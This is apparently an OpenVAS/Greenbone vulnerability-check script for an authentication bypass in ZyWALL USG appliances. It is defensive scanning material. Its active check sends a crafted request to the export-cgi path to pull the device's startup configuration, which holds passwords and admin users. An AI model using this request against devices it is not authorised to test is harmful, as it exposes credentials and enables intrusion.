# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103161");
  script_version("2024-01-09T05:06:46+0000");
  script_tag(name:"last_modification", value:"2024-01-09 05:06:46 +0000 (Tue, 09 Jan 2024)");
  script_tag(name:"creation_date", value:"2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Multiple ZyWALL USG Products Remote Security Bypass Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Multiple ZyWALL USG products are prone to a security bypass
  vulnerability.

  Note: Reportedly, the firmware is also prone to a weakness that allows password-protected upgrade
  files to be decrypted with a known plaintext attack.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploits may allow attackers to bypass certain
  security restrictions and perform unauthorized actions.");

  script_tag(name:"affected", value:"The following models are known to be affected:

  - ZyWALL USG-20

  - ZyWALL USG-20W

  - ZyWALL USG-50

  - ZyWALL USG-100

  - ZyWALL USG-200

  - ZyWALL USG-300

  - ZyWALL USG-1000

  - ZyWALL USG-1050

  - ZyWALL USG-2000");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed. However, Symantec has not confirmed
  this. Please contact the vendor for more information.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20200229153107/https://www.securityfocus.com/bid/47707/");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2011-003/-authentication-bypass-in-configuration-import-and-export-of-zyxel-zywall-usg-appliances");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port(default:443);

if(http_vuln_check(port:port, url:"/", pattern:"<title>ZyWALL USG", usecache:TRUE)) {

  url = "/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf";
  if(http_vuln_check(port:port, url:url, pattern:"model: ZyWALL USG", extra_check:make_list("password", "interface", "user-type admin"))) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
